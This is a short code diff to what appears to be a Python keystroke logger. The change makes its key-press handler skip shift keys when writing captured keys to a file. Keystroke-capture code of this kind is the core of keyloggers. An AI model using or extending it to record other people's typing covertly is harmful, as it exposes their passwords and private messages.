@@ -13,6 +13,8 @@ def on_press(key):
         print('{0}'.format(key))
         if key == keyboard.Key.space:
             output_file.write(' ')
+        elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
+            output_file.write('')
         else:
             output_file.write('[{0}] '.format(key))
 
